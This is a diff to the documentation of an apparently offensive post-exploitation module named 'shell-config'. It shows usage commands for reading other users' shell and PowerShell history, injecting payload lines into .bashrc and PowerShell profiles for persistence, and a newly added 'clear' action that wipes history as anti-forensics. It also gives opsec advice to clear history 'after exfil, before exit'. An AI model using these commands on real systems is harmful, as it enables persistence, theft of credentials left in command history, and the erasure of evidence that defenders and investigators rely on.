@@ -13,11 +13,11 @@ Read shell history files, enumerate shell configuration files, and inject/remove
 
 | Argument | Required | Description |
 |----------|----------|-------------|
-| action | Yes | `history`: read shell history files (Unix only), `list`: enumerate config/history files, `read`: view a specific file, `inject`: append a line, `remove`: delete a matching line |
+| action | Yes | `history`: read shell/PowerShell history files, `list`: enumerate config/history files, `read`: view a specific file, `inject`: append a line, `remove`: delete a matching line, `clear`: securely wipe history files |
 | file | Read/Inject/Remove | Target file. Unix: `.bashrc`, `.zshrc`, `/etc/profile`. Windows: profile name (e.g., `PS7 CurrentUser CurrentHost`) or full path. |
 | line | Inject/Remove | Command line to inject or remove |
 | user | No | Target user (default: current user). Requires privileges for other users. |
-| lines | No | Number of history lines to show (default 100, Unix only) |
+| lines | No | Number of history lines to show (default 100) |
 | comment | No | Optional inline comment appended to injected line (for tracking/cleanup) |
 
 ## Usage
@@ -42,13 +42,28 @@ shell-config -action remove -file .bashrc -line "/tmp/payload &"
 
 # Read another user's history (requires privileges)
 shell-config -action history -user root
+
+# Clear all shell history files (anti-forensics)
+shell-config -action clear
+
+# Clear a specific history file
+shell-config -action clear -file .bash_history
+
+# Clear another user's history (requires privileges)
+shell-config -action clear -user root
 ```
 
-### Windows (PowerShell Profiles)
+### Windows (PowerShell Profiles & History)
 
 ```
 # List all PowerShell profile locations and their existence
 shell-config -action list
+
+# Read PowerShell command history (PSReadLine)
+shell-config -action history
+
+# Read last 50 lines of history
+shell-config -action history -lines 50
 
 # Read a specific profile
 shell-config -action read -file "PS7 CurrentUser CurrentHost"
@@ -61,6 +76,12 @@ shell-config -action inject -file "C:\Users\admin\Documents\PowerShell\Microsoft
 
 # Remove an injected line
 shell-config -action remove -file "PS7 CurrentUser CurrentHost" -line "Start-Process C:\temp\payload.exe"
+
+# Clear all PowerShell history files (anti-forensics)
+shell-config -action clear
+
+# Clear a specific history file
+shell-config -action clear -file "C:\Users\admin\AppData\Roaming\Microsoft\Windows\PowerShell\PSReadLine\ConsoleHost_history.txt"
 ```
 
 ## Shell Files Scanned
@@ -79,7 +100,15 @@ shell-config -action remove -file "PS7 CurrentUser CurrentHost" -line "Start-Pro
 - `/etc/profile`, `/etc/bash.bashrc`, `/etc/bashrc`
 - `/etc/zshrc`, `/etc/zsh/zshrc`, `/etc/zsh/zprofile`, `/etc/environment`
 
-### Windows (PowerShell Profiles)
+### Windows
+
+#### PowerShell History Files (PSReadLine)
+- `%APPDATA%\Microsoft\Windows\PowerShell\PSReadLine\ConsoleHost_history.txt` — PowerShell console
+- `%APPDATA%\Microsoft\Windows\PowerShell\PSReadLine\Visual Studio Code Host_history.txt` — VS Code terminal
+- `%APPDATA%\Microsoft\Windows\PowerShell\PSReadLine\Windows PowerShell ISE Host_history.txt` — ISE
+- `%APPDATA%\Microsoft\Windows\PowerShell\PSReadLine\ServerRemoteHost_history.txt` — PSRemoting
+
+#### PowerShell Profiles
 
 Profiles are listed in load order. Both PowerShell 7+ and Windows PowerShell 5.1 paths are checked.
 
@@ -104,9 +133,12 @@ Profiles are listed in load order. Both PowerShell 7+ and Windows PowerShell 5.1
 - The `inject` action skips duplicate lines to avoid repeated injection
 - The `comment` parameter helps track injected lines for cleanup
 - PowerShell profile directories are created automatically if they don't exist
+- The `clear` action reads files before truncating to zero history content in memory (opsec)
+- Clearing history is a standard post-exploitation cleanup step; consider timing (clear after exfil, before exit)
 
 ## MITRE ATT&CK Mapping
 
 - **T1546.004** — Event Triggered Execution: Unix Shell Configuration Modification
 - **T1546.013** — Event Triggered Execution: PowerShell Profile
 - **T1552.003** — Unsecured Credentials: Bash History
+- **T1070.003** — Indicator Removal: Clear Command History
